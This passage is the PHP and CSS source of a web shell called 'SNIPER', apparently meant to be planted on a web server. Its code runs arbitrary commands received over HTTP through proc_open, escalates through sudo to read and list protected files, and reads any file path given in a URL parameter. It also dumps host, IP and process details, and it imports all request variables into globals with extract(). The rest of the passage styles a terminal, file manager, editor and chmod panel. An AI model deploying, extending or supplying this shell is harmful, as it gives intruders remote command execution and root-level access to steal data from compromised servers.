    $sym .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $sym .= (($perms & 0x0004) ? 'r' : '-');
    $sym .= (($perms & 0x0002) ? 'w' : '-');
    $sym .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));

    $type_char = (($perms & 0xF000) === 0xC000) ? 'l' : ((($perms & 0xF000) === 0x8000) ? '-' : 'd');

    $owner_name = fileowner($path);
    if (function_exists('posix_getpwuid')) {
        $pw = @posix_getpwuid($owner_name);
        if ($pw) $owner_name = $pw['name'];
    }
    $group_name = filegroup($path);
    if (function_exists('posix_getgrgid')) {
        $gr = @posix_getgrgid($group_name);
        if ($gr) $group_name = $gr['name'];
    }

    return [
        'octal'   => substr(sprintf('%o', $perms), -4),
        'symbol'  => $type_char . $sym,
        'owner'   => (string)$owner_name,
        'owner_uid' => fileowner($path),
        'group'   => (string)$group_name,
        'group_gid' => filegroup($path),
        'size'    => filesize($path),
        'mtime'   => date('Y-m-d H:i:s', filemtime($path)),
        'ctime'   => date('Y-m-d H:i:s', filectime($path)),
        'readable'=> is_readable($path),
        'writable'=> is_writable($path),
        'executable' => is_executable($path),
        'type'    => filetype($path),
        'mime'    => function_exists('mime_content_type') ? (@mime_content_type($path) ?: 'unknown') : 'unknown',
        'lines'   => is_readable($path) && filesize($path) < 1048576 ? count(@file($path) ?: []) : null,
    ];
}

// ==================== FILE VIEWER LOGIC ====================
$view_file_content = null;
$view_file_name = '';
$view_file_size = 0;
$view_file_perms = '';
$view_file_info = null;

if (isset($_GET['view_file']) && !empty($_GET['view_file'])) {
    $view_path = $_GET['view_file'];
    $vf_isfile = is_file($view_path) || (rootModeOn() && rootExists($view_path, '-f'));
    if ($vf_isfile) {
        $file_size = @filesize($view_path);
        if ($file_size === false && rootModeOn()) {
            [$vsc, $vso] = sudoRun('stat -c %s -- ' . escapeshellarg($view_path));
            $file_size = ($vsc === 0) ? (int)trim($vso) : false;
        }
        if ($file_size !== false && $file_size <= 2 * 1024 * 1024) { // 2MB limit
            $content = @file_get_contents($view_path);
            if ($content === false && rootModeOn()) {
                [$vc, $vout] = sudoRun('cat -- ' . escapeshellarg($view_path));
                $content = ($vc === 0) ? $vout : false;
            }
            if ($content !== false) {
                // Check if binary
                $is_binary = false;
                $sample = substr($content, 0, 512);
                for ($i = 0; $i < strlen($sample); $i++) {
                    $ord = ord($sample[$i]);
                    if ($ord < 9 || ($ord > 13 && $ord < 32)) { $is_binary = true; break; }
                }
                $view_file_content = $is_binary 
                    ? "// [Binary File - Cannot display]\n// Size: " . $file_size . " bytes\n// Use download feature to view"
                    : $content;
                $view_file_name = basename($view_path);
                $view_file_size = $file_size;
                $view_file_perms = substr(sprintf('%o', fileperms($view_path)), -4);
                $view_file_info = getFileInfoDetailed($view_path);
            } else {
                $view_file_content = "// Permission denied - cannot read file";
                $view_file_name = basename($view_path);
            }
        } else {
            $view_file_content = "// File too large to preview (>2MB)\n// Size: " . formatBytesPreview($file_size ?: 0);
            $view_file_name = basename($view_path);
        }
    } else {
        $view_file_content = "// File not found or not a regular file";
        $view_file_name = basename($view_path);
    }
}

function formatBytesPreview($bytes, $precision = 2) {
    $units = ['B', 'KB', 'MB', 'GB'];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= (1 << (10 * $pow));
    return round($bytes, $precision) . ' ' . $units[$pow];
}

// ==================== SHELL LOGIC ====================
define('PHPSHELL_VERSION', SHELL_VERSION);

if (ini_get('register_globals') != '1') {
    if (!empty($_POST)) extract($_POST);
    if (!empty($_GET)) extract($_GET);
    if (!empty($_SERVER)) extract($_SERVER);
}

$work_dir = !empty($work_dir) ? $work_dir : getcwd();
$requested_dir = $work_dir;
$entered = true;
$wd_isdir = is_dir($work_dir) || (rootModeOn() && rootExists(rtrim($work_dir, '/'), '-d'));

if (!empty($command)
    && strpos($command, "\n") === false
    && preg_match('/^[[:blank:]]*cd[[:blank:]]+([^;]+)$/', $command, $regs)) {
    $new_dir = $regs[1][0] == '/' ? $regs[1] : $work_dir . '/' . $regs[1];
    if (is_dir($new_dir) || (rootModeOn() && rootExists(rtrim($new_dir, '/'), '-d'))) {
        if (@chdir($new_dir)) {
            $work_dir = $new_dir;
        } else {
            $entered = false;
            if (!rootModeOn()) setFlash('error', 'Permission denied: cannot enter ' . htmlspecialchars($new_dir));
        }
    }
    unset($command);
} elseif ($wd_isdir) {
    if (!@chdir($work_dir)) {
        $entered = false;
        if (!rootModeOn()) setFlash('error', 'Permission denied: cannot enter ' . htmlspecialchars($work_dir));
    }
}

$cwd_now = @getcwd();
if ($cwd_now !== false && ($entered || !is_dir($requested_dir))) {
    $work_dir = $cwd_now;
}
if (!$entered && rootModeOn() && (is_dir($requested_dir) || rootExists(rtrim($requested_dir, '/'), '-d'))) {
    $work_dir = rtrim($requested_dir, '/');   // browse via sudo find
}
$current_user = get_current_user();
$os_info = php_uname('s');
$php_version = phpversion();
$disk_total = @disk_total_space("/");
$disk_free = @disk_free_space("/");
$disk_used = $disk_total - $disk_free;
$disk_percent = $disk_total > 0 ? ($disk_used / $disk_total) * 100 : 0;
$memory_usage = memory_get_usage(true);
$memory_peak = memory_get_peak_usage(true);
$memory_percent = $memory_peak > 0 ? ($memory_usage / $memory_peak) * 100 : 0;
$cpu_load = function_exists('sys_getloadavg') ? sys_getloadavg() : [0, 0, 0];
$cpu_load_avg = $cpu_load[0];
$uptime = @file_exists('/proc/uptime') ? @file_get_contents('/proc/uptime') : null;
$uptime_sec = $uptime ? (float)explode(' ', $uptime)[0] : 0;

function sniperRefreshListing(string $listDir, bool $showHidden): array {
    $directories = [];
    $files = [];
    $scan_denied = false;

    if (rootModeOn() && !is_readable($listDir)
        && (is_dir($listDir) || rootExists(rtrim($listDir, '/'), '-d'))) {
        // ---- Root-mode listing via sudo find ----
        $raw_list = rootListRaw($listDir);
        if (trim($raw_list) === '') {
            $scan_denied = true;
        }
        foreach (explode("\n", rtrim($raw_list, "\n")) as $ln) {
            if (trim($ln) === '') continue;
            $parts = explode("\t", $ln, 5);
            if (count($parts) < 5) continue;
            [$lty, $lsz, $lmt, $lpm, $lnm] = $parts;
            if ($lnm === '' || $lnm === '.' || $lnm === '..') continue;
            if (!$showHidden && $lnm[0] === '.') continue;   // hidden files toggle
            $fpath = rtrim($listDir, '/') . '/' . $lnm;
            $lext = strtolower(pathinfo($lnm, PATHINFO_EXTENSION));
            if ($lty === 'd') {
                $directories[] = ['name' => $lnm, 'path' => $fpath, 'mtime' => (int)$lmt,
                    'perms' => str_pad($lpm, 4, '0', STR_PAD_LEFT), 'readable' => true];
            } else {
                $files[] = ['name' => $lnm, 'path' => $fpath, 'size' => (int)$lsz, 'mtime' => (int)$lmt,
                    'perms' => str_pad($lpm, 4, '0', STR_PAD_LEFT), 'mime' => '', 'writable' => true,
                    'iszip' => $lext === 'zip',
                    'isimg' => in_array($lext, ['png','jpg','jpeg','gif','webp','bmp','svg','ico'], true)];
            }
        }
    } else {
        $raw_items = @scandir($listDir);
        $scan_denied = ($raw_items === false);
        foreach (($raw_items ?: []) as $item) {
            if ($item === '.' || $item === '..') continue;
            if (!$showHidden && $item[0] === '.') continue; // hidden files toggle
            $path = $listDir . DIRECTORY_SEPARATOR . $item;
            if (is_dir($path)) {
                $directories[] = ['name' => $item, 'path' => $path, 'mtime' => @filemtime($path), 'perms' => substr(sprintf('%o', @fileperms($path)), -4), 'readable' => @is_readable($path)];
            } else {
                $mime = function_exists('mime_content_type') ? @mime_content_type($path) : '';
                $files[] = [
                    'name'  => $item,
                    'path'  => $path,
                    'size'  => @filesize($path),
                    'mtime' => @filemtime($path),
                    'perms' => substr(sprintf('%o', @fileperms($path)), -4),
                    'mime'  => $mime ?: '',
                    'writable' => is_writable($path),
                    'iszip' => strtolower(pathinfo($item, PATHINFO_EXTENSION)) === 'zip',
                    'isimg' => strpos((string)$mime, 'image/') === 0,
                ];
            }
        }
    }
    return [$directories, $files, $scan_denied];
}

$show_hidden = (($_GET['show_hidden'] ?? '0') === '1');
[$directories, $files, $scan_denied] = sniperRefreshListing($work_dir, $show_hidden);

// ---- Sorting (server-side, URL params) ----
$sort_by = in_array($_GET['sort'] ?? '', ['name','size','date'], true) ? $_GET['sort'] : 'name';
$sort_dir = ($_GET['dir'] ?? 'asc') === 'desc' ? SORT_DESC : SORT_ASC;
usort($files, function($a, $b) use ($sort_by, $sort_dir) {
    if ($sort_by === 'size')  $c = ((int)$a['size'] <=> (int)$b['size']);
    elseif ($sort_by === 'date') $c = ((int)$a['mtime'] <=> (int)$b['mtime']);
    else $c = strnatcasecmp($a['name'], $b['name']);
    return $c * ($sort_dir === SORT_ASC ? 1 : -1);
});
usort($directories, fn($a,$b) => strnatcasecmp($a['name'],$b['name']) * ($sort_dir === SORT_ASC ? 1 : -1));

// ---- Pagination ----
define('SNIPER_PAGE_SIZE', 100);
$total_files = count($files);
$total_pages = max(1, (int)ceil($total_files / SNIPER_PAGE_SIZE));
$page = max(1, min((int)($_GET['page'] ?? 1), $total_pages));
$files_page = array_slice($files, ($page - 1) * SNIPER_PAGE_SIZE, SNIPER_PAGE_SIZE);

// ---- Quick system facts for header strip ----
$hostname_str   = gethostname() ?: php_uname('n');
$kernel_str     = php_uname('s') . ' ' . php_uname('r');
$client_ip      = $_SERVER['REMOTE_ADDR'] ?? '-';
$server_ip      = gethostbyname($hostname_str);
$proc_count     = null;
$procs_raw = runCmdSafe('ps aux --no-header | wc -l');
if ($procs_raw !== null) $proc_count = (int)trim($procs_raw);

function sniperExec(string $command, string &$work_dir, array &$directories, array &$files, bool $show_hidden): string {
    $out = '';
    $cur_user = get_current_user();

    // ---- multi-command support: one command per line ----
    $cmd_lines = preg_split('/\r?\n/', (string)$command);
    $cmd_lines = array_values(array_filter(array_map('trim', $cmd_lines),
        fn($l) => $l !== '' && $l[0] !== '#'));
    if (count($cmd_lines) > 50) $cmd_lines = array_slice($cmd_lines, 0, 50);

    foreach ($cmd_lines as $command) {
        $out .= "sniper:~$ " . htmlspecialchars($command) . "\n";

        if (preg_match('/^[[:blank:]]*cd[[:blank:]]+([^;]+)$/', $command, $cdm)) {
            $nd = trim($cdm[1]);
            if ($nd === '~' || $nd === '~/') { $nd = $cur_user === 'root' ? '/root' : '/home/' . $cur_user; }
            elseif (str_starts_with($nd, '~/')) { $nd = ($cur_user === 'root' ? '/root/' : '/home/' . $cur_user . '/') . substr($nd, 2); }
            $nd_full = $nd[0] === '/' ? $nd : $work_dir . '/' . $nd;
            if (@chdir($nd_full) || (rootModeOn() && rootExists(rtrim($nd_full, '/'), '-d'))) {
                $work_dir = rtrim($nd_full, '/') === '' ? '/' : $nd_full;
                [$directories, $files] = sniperRefreshListing($work_dir, $show_hidden);
                $out .= "-> " . $work_dir . "\n\n";
            } else {
                $out .= "cd: no such directory or access denied: " . htmlspecialchars($nd) . "\n\n";
            }
            continue;
        }

        if ($command === 'help') {
            $out .= "Available commands:\n";
            $out .= "  help     - Show this help\n";
            $out .= "  clear    - Clear terminal\n";
            $out .= "  date     - Show current date/time\n";
            $out .= "  whoami   - Show current user\n";
            $out .= "  pwd      - Show current directory\n";
            $out .= "  ls       - List directory contents\n";
            $out .= "  sysinfo  - Show system information\n";
            $out .= "  cat FILE - View file in UI modal\n";
            $out .= "  Multi    - One command per line runs in sequence (cd state persists)\n\n";
        } elseif ($command === 'clear') {
            $out = "";
        } elseif ($command === 'date') {
            $out .= date('Y-m-d H:i:s') . "\n\n";
        } elseif ($command === 'whoami') {
            $out .= $cur_user . "\n\n";
        } elseif ($command === 'pwd') {
            $out .= $work_dir . "\n\n";
        } elseif ($command === 'ls') {
            $out .= "Directories:\n";
            foreach ($directories as $dir) {
                $out .= "  [DIR]  " . $dir['name'] . "\n";
            }
            $out .= "\nFiles:\n";
            foreach ($files as $file) {
                $out .= "  [FILE] " . $file['name'] . "\n";
            }
            $out .= "\n";
        } elseif ($command === 'sysinfo') {
            $load_arr = function_exists('sys_getloadavg') ? sys_getloadavg() : [0];
            $out .= "System Information:\n";
            $out .= "  OS            : " . php_uname('s') . "\n";
            $out .= "  PHP Version   : " . PHP_VERSION . "\n";
            $out .= "  Current User  : " . $cur_user . "\n";
            $out .= "  Current Dir   : " . $work_dir . "\n";
            $out .= "  CPU Load      : " . $load_arr[0] . "\n\n";
        } elseif (preg_match('/^cat\s+(.+)$/', $command, $cat_matches)) {
            // UI-based cat: client opens file viewer modal
            $cat_target = trim($cat_matches[1]);
            $cat_full_path = $cat_target[0] === '/' ? $cat_target : $work_dir . '/' . $cat_target;
            $out .= "Opening file viewer for: " . htmlspecialchars($cat_target) . "\n\n";
            $out .= "__SNIPER_VIEW__" . json_encode($cat_full_path) . "\n";
        } else {
            $descriptorspec = [
                0 => ["pipe", "r"],
                1 => ["pipe", "w"],
                2 => ["pipe", "w"]
            ];
            $proc_cwd = is_readable($work_dir) ? $work_dir : sys_get_temp_dir();
            $process = @proc_open($command, $descriptorspec, $pipes, $proc_cwd);
            if (is_resource($process)) {
                fclose($pipes[0]);
                $cmd_output = stream_get_contents($pipes[1]);
                $errors = stream_get_contents($pipes[2]);
                fclose($pipes[1]);
                fclose($pipes[2]);
                proc_close($process);
                if (!empty($cmd_output)) $out .= htmlspecialchars($cmd_output);
                if (!empty($errors)) $out .= "ERROR:\n" . htmlspecialchars($errors);
            } else {
                $out .= "Failed to execute command\n";
            }
            $out .= "\n";
        }
    }
    return $out;
}

$output_content = "sniper:~$ Welcome to " . SHELL_VERSION ." SHELL \nType 'help' for available commands.\n\n";

if (!empty($command)) {
    $exec_out = sniperExec($command, $work_dir, $directories, $files, $show_hidden);
    // convert viewer markers into postMessage script (server-rendered path)
    $exec_out = preg_replace_callback(
        '/^__SNIPER_VIEW__(.+)$/m',
        fn($m) => "<script>window.parent.postMessage({type:'openViewer',path:" . $m[1] . "}, '*');</script>",
        $exec_out
    );
    $output_content .= $exec_out;
}

function formatBytes($bytes, $precision = 2) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= (1 << (10 * $pow));
    return round($bytes, $precision) . ' ' . $units[$pow];
}

function formatUptime($seconds) {
    $days = floor($seconds / 86400);
    $hours = floor(($seconds % 86400) / 3600);
    $mins = floor(($seconds % 3600) / 60);
    return "{$days}d {$hours}h {$mins}m";
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SNIPER | Interactive Terminal</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary: #ff0033;
            --primary-dim: #cc0029;
            --accent: #ff4d6d;
            --cyan: #00e5ff;
            --dark: #0a0a0a;
            --darker: #050505;
            --card: #0f0f0f;
            --gray: #1a1a1a;
            --border: #2a2a2a;
            --text: #e8e8e8;
            --muted: #888;
            --success: #00e676;
            --warning: #ffab00;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: var(--darker);
            color: var(--text);
            min-height: 100vh;
            padding: 16px;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            background-attachment: fixed;
        }
        body::before {
            content: "";
            position: fixed;
            inset: 0;
            background:
                radial-gradient(circle at 15% 20%, rgba(255, 0, 51, 0.08) 0%, transparent 25%),
                radial-gradient(circle at 85% 75%, rgba(0, 229, 255, 0.05) 0%, transparent 25%);
            z-index: -1;
            pointer-events: none;
        }
        .matrix-bg {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            z-index: -2;
            opacity: 0.07;
        }
        .container { max-width: 1400px; margin: 0 auto; }
        header {
            text-align: center;
            padding: 18px 0 12px;
            margin-bottom: 18px;
            position: relative;
        }
        .logo {
            font-size: 3.2rem;
            font-weight: 800;
            letter-spacing: 8px;
            background: linear-gradient(90deg, var(--primary), var(--accent));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            text-shadow: 0 0 30px rgba(255, 0, 51, 0.3);
            display: inline-block;
            position: relative;
        }
        .logo::after {
            content: "_";
            color: var(--primary);
            animation: blink 1s infinite;
            position: absolute;
            right: -22px;
        }
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0; }
        }
        .subtitle {
            color: var(--muted);
            font-size: 0.95rem;
            letter-spacing: 3px;
            margin-top: 6px;
            text-transform: uppercase;
        }
        .top-bar {
            display: flex;
            justify-content: flex-end;
            margin-bottom: 12px;
        }
        .logout-btn {
            background: transparent;
            border: 1px solid var(--border);
            color: var(--muted);
            padding: 6px 14px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.85rem;
            text-decoration: none;
            transition: all 0.2s;
        }
        .logout-btn:hover {
            border-color: var(--primary);
            color: var(--primary);
        }
        .grid-container {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 18px;
            margin-bottom: 20px;
        }
        @media (max-width: 992px) {
            .grid-container { grid-template-columns: 1fr; }
        }
        .card {
            background: rgba(15, 15, 15, 0.9);
            border-radius: 10px;
            padding: 22px;
            border: 1px solid var(--border);
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
        }
        .card-full { grid-column: 1 / -1; }
        .card-title {
            color: var(--primary);
            margin-bottom: 18px;
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 1.25rem;
            font-weight: 600;
        }
        .path-container {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 14px;
            flex-wrap: wrap;
        }
        .current-path {
            background: var(--gray);
            padding: 11px 14px;
            border-radius: 6px;
            flex-grow: 1;
            min-width: 260px;
            border: 1px solid var(--border);
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
            overflow-x: auto;
            white-space: nowrap;
        }
        .breadcrumb {
            display: flex;
            flex-wrap: wrap;
            gap: 4px;
            margin-top: 8px;
        }
        .breadcrumb a {
            color: var(--cyan);
            text-decoration: none;
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 0.85rem;
            transition: background 0.2s;
        }
        .breadcrumb a:hover { background: rgba(0, 229, 255, 0.1); }
        .directory-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
            gap: 12px;
            margin-top: 16px;
            max-height: 320px;
            overflow-y: auto;
        }
        .directory-item {
            background: var(--gray);
            border-radius: 8px;
            padding: 14px 10px;
            text-align: center;
            cursor: pointer;
            transition: all 0.2s;
            border: 1px solid transparent;
            position: relative;
        }
        .directory-item:hover {
            transform: translateY(-3px);
            border-color: var(--primary);
            box-shadow: 0 4px 12px rgba(255, 0, 51, 0.15);
        }
        .directory-item.folder { color: var(--cyan); }
        .directory-item.file { color: var(--warning); }
        .directory-item.file:hover::after {
            content: "Click to view";
            position: absolute;
            bottom: -22px;
            left: 50%;
            transform: translateX(-50%);
            font-size: 0.65rem;
            color: var(--muted);
            white-space: nowrap;
        }
        .directory-item i {
            font-size: 1.6rem;
            margin-bottom: 8px;
            display: block;
        }
        .directory-item .name {
            font-size: 0.8rem;
            word-break: break-all;
        }
        .directory-select {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin-top: 14px;
        }
        select, input[type="text"], button {
            padding: 11px 14px;
            border-radius: 6px;
            border: none;
            background: var(--gray);
            color: var(--text);
            font-size: 0.95rem;
            outline: none;
        }
        select {
            flex-grow: 1;
            min-width: 220px;
            border: 1px solid var(--border);
        }
        input[type="text"] {
            flex-grow: 1;
            min-width: 220px;
            border: 1px solid var(--border);
        }
        input[type="text"]:focus { border-color: var(--primary); }
        button {
            background: linear-gradient(90deg, var(--primary), var(--primary-dim));
            color: #fff;
            cursor: pointer;
            font-weight: 600;
            border: 1px solid rgba(255, 0, 51, 0.4);
            transition: all 0.2s;
        }
        button:hover {
            transform: translateY(-1px);
            box-shadow: 0 4px 14px rgba(255, 0, 51, 0.3);
        }
        .command-section {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin-top: 14px;
        }
        .output-container { margin-top: 16px; position: relative; }
        .terminal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 8px;
        }
        .terminal-header h3 { font-size: 1rem; color: var(--muted); }
        .controls { display: flex; gap: 8px; }
        .btn-small {
            padding: 6px 12px;
            font-size: 0.8rem;
            background: var(--gray);
            border: 1px solid var(--border);
        }
        .btn-small:hover {
            border-color: var(--primary);
            color: var(--primary);
            background: var(--gray);
            box-shadow: none;
            transform: none;
        }
        textarea {
            width: 100%;
            min-height: 280px;
            background: #080808;
            color: var(--success);
            padding: 16px;
            border-radius: 6px;
            border: 1px solid var(--border);
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
            resize: vertical;
            white-space: pre;
            overflow-x: auto;
            line-height: 1.45;
        }
        .status-bar {
            display: flex;
            justify-content: space-between;
            background: rgba(0, 0, 0, 0.45);
            padding: 10px 14px;
            border-radius: 6px;
            margin-top: 12px;
            font-size: 0.85rem;
            border: 1px solid var(--border);
            flex-wrap: wrap;
            gap: 10px;
        }
        .connection-indicator {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .indicator {
            width: 9px;
            height: 9px;
            border-radius: 50%;
            background: var(--success);
            box-shadow: 0 0 8px var(--success);
        }
        .system-info { display: flex; gap: 18px; flex-wrap: wrap; }
        .info-item {
            display: flex;
            align-items: center;
            gap: 6px;
            color: var(--muted);
        }
        .progress-container { margin-top: 12px; }
        .progress-bar {
            height: 8px;
            background: #222;
            border-radius: 4px;
            overflow: hidden;
            margin-top: 6px;
        }
        .progress-fill { height: 100%; border-radius: 4px; }
        .stat-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
            gap: 14px;
        }
        .stat-card {
            background: rgba(20, 20, 20, 0.7);
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 16px;
        }
        .stat-card h3 {
            font-size: 0.95rem;
            color: var(--muted);
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .stat-value {
            font-size: 1.6rem;
            font-weight: 700;
            color: var(--cyan);
        }

        /* ===== File Viewer Modal ===== */
        .modal-overlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.85);
            backdrop-filter: blur(4px);
            z-index: 9999;
            align-items: center;
            justify-content: center;
            padding: 24px;
            animation: fadeIn 0.2s ease-out;
        }
        .modal-overlay.active { display: flex; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        .modal-box {
            background: var(--card);
            border: 1px solid var(--primary);
            border-radius: 12px;
            width: 100%;
            max-width: 900px;
            height: 80vh;
            display: flex;
            flex-direction: column;
            box-shadow: 0 0 60px rgba(255, 0, 51, 0.25);
            animation: slideUp 0.25s ease-out;
        }
        @keyframes slideUp {
            from { transform: translateY(30px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        .modal-header {
            padding: 16px 22px;
            border-bottom: 1px solid var(--border);
            display: flex;
            justify-content: space-between;
            align-items: center;
            gap: 16px;
            flex-shrink: 0;
        }
        .modal-title-group {
            display: flex;
            align-items: center;
            gap: 12px;
            min-width: 0;
        }
        .modal-title-group i { color: var(--primary); font-size: 1.1rem; }
        .modal-file-name {
            font-weight: 600;
            color: var(--text);
            font-size: 1rem;
            word-break: break-all;
        }
        .modal-meta {
            display: flex;
            gap: 12px;
            margin-left: auto;
            font-size: 0.75rem;
            color: var(--muted);
            white-space: nowrap;
        }
        .modal-actions {
            display: flex;
            gap: 8px;
            flex-shrink: 0;
        }
        .modal-body {
            flex-grow: 1;
            overflow: hidden;
            display: flex;
            flex-direction: column;
        }
        .modal-content-area {
            margin: 0;
            padding: 20px 22px;
            overflow: auto;
            flex-grow: 1;
            font-family: 'Courier New', monospace;
            font-size: 0.85rem;
            line-height: 1.55;
            color: var(--success);
            background: #080808;
            white-space: pre-wrap;
            word-break: break-word;
        }
        .modal-footer {
            padding: 12px 22px;
            border-top: 1px solid var(--border);
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 0.75rem;
            color: var(--muted);
            flex-shrink: 0;
        }
        .close-modal {
            background: transparent !important;
            border: 1px solid var(--border) !important;
            color: var(--muted) !important;
            padding: 6px 12px !important;
            font-size: 0.85rem !important;
        }
        .close-modal:hover {
            border-color: var(--primary) !important;
            color: var(--primary) !important;
            box-shadow: none !important;
            transform: none !important;
        }

        /* ===== Edit Mode Toolbar ===== */
        .edit-toolbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 22px;
            background: rgba(255, 171, 0, 0.08);
            border-bottom: 1px solid rgba(255, 171, 0, 0.3);
            color: var(--warning);
            font-size: 0.8rem;
            letter-spacing: 1px;
            flex-shrink: 0;
            gap: 12px;
            flex-wrap: wrap;
        }
        .edit-form {
            display: none;
            flex-direction: column;
            flex-grow: 1;
            overflow: hidden;
        }
        #editTextarea {
            flex-grow: 1 !important;
            resize: none;
            width: 100%;
            border-radius: 0;
            border: none;
            outline: none;
            font-family: 'Courier New', monospace;
            font-size: 0.85rem;
            line-height: 1.55;
            padding: 20px 22px;
            background: #000;
            color: #fff;
            white-space: pre;
            overflow: auto;
            tab-size: 4;
        }
        .edit-actions {
            display: flex;
            gap: 10px;
            padding: 12px 22px;
            background: rgba(255, 171, 0, 0.05);
            border-top: 1px solid var(--border);
            justify-content: flex-end;
            flex-shrink: 0;
        }
        .btn-save {
            background: linear-gradient(90deg, #00c853, #009624) !important;
            border-color: rgba(0, 200, 83, 0.5) !important;
            padding: 9px 18px !important;
            font-size: 0.85rem !important;
        }
        .btn-cancel {
            background: var(--gray) !important;
            border: 1px solid var(--border) !important;
            color: var(--text) !important;
            padding: 9px 18px !important;
            font-size: 0.85rem !important;
        }

        /* ===== Status Flash Messages ===== */
        .status-flash {
            padding: 10px 22px;
            font-size: 0.85rem;
            display: flex;
            align-items: center;
            gap: 10px;
            flex-shrink: 0;
        }
        .status-success {
            background: rgba(0, 230, 118, 0.1);
            color: var(--success);
            border-bottom: 1px solid rgba(0, 230, 118, 0.3);
        }
        .status-error {
            background: rgba(255, 0, 51, 0.12);
            color: var(--accent);
            border-bottom: 1px solid rgba(255, 0, 51, 0.35);
        }

        /* ===== Permissions Panel ===== */
        .perm-panel {
            padding: 16px 22px;
            border-bottom: 1px solid var(--border);
            background: rgba(0, 229, 255, 0.03);
            flex-shrink: 0;
            max-height: 260px;
            overflow-y: auto;
        }
        .perm-panel h4 {
            color: var(--cyan);
            font-size: 0.9rem;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .perm-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 8px 18px;
            margin-bottom: 14px;
        }
        .perm-item {
            display: flex;
            justify-content: space-between;
            font-size: 0.78rem;
            padding: 6px 10px;
            background: var(--gray);
            border-radius: 4px;
            border: 1px solid var(--border);
        }
        .perm-item .k { color: var(--muted); }
        .perm-item .v { color: var(--cyan); font-family: monospace; word-break: break-all; }
        .perm-item .v.yes { color: var(--success); }
        .perm-item .v.no { color: var(--accent); }
        .perm-form {
            display: flex;
            gap: 10px;
            align-items: center;
            flex-wrap: wrap;
            margin-top: 4px;
        }
        .perm-form label { font-size: 0.8rem; color: var(--muted); }
        .perm-form input[type="text"] {
            width: 90px;
            min-width: unset;
            flex-grow: 0;
            padding: 7px 10px;
            font-family: monospace;
            text-align: center;
        }
        .btn-chmod {
            padding: 7px 14px !important;
            font-size: 0.8rem !important;
            background: linear-gradient(90deg, #00838f, #006064) !important;
            border-color: rgba(0, 229, 255, 0.4) !important;
        }
        footer {
            text-align: center;
            padding: 18px;
            color: #555;
            font-size: 0.8rem;
            margin-top: 10px;
        }

        /* ===== Flash Bar ===== */
        .flash-bar {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 12px 18px;
            border-radius: 8px;
            margin-bottom: 14px;
            font-size: 0.9rem;
        }
        .flash-bar button {
            margin-left: auto;
            background: transparent !important;
            border: none !important;
            color: inherit !important;
            font-size: 1.1rem;
            cursor: pointer;
            padding: 0 6px;
            box-shadow: none !important;
            transform: none !important;
        }
        .flash-success { background: rgba(0, 230, 118, 0.12); border: 1px solid rgba(0,230,118,.35); color: var(--success); }
        .flash-error   { background: rgba(255, 0, 51, 0.14); border: 1px solid rgba(255,0,51,.4); color: var(--accent); }

        /* ===== File Manager Toolbar ===== */
        .fm-toolbar {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin-bottom: 6px;
        }
        .fm-upload { display: flex; }
        .fm-btn {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 9px 16px;
            font-size: 0.85rem;
            background: var(--gray);
            color: var(--text);
            border: 1px solid var(--border);
            border-radius: 6px;
            cursor: pointer;
            transition: all .2s;
        }
        .fm-btn:hover {
            border-color: var(--primary);
            color: var(--primary);
            transform: translateY(-1px);
        }

        /* ===== Directory item metadata + hover actions ===== */
        .directory-item { overflow: visible; position: relative; }
        .fmeta {
            font-size: 0.65rem;
            color: var(--muted);
            margin-top: 4px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        .item-actions {
            display: flex;
            gap: 6px;
            justify-content: center;
            position: absolute;
            top: -10px;
            left: 50%;
            transform: translateX(-50%) translateY(-100%);
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 20px;
            padding: 5px 10px;
            opacity: 0;
            pointer-events: none;
            transition: opacity .15s;
            z-index: 50;
            box-shadow: 0 4px 14px rgba(0,0,0,.5);
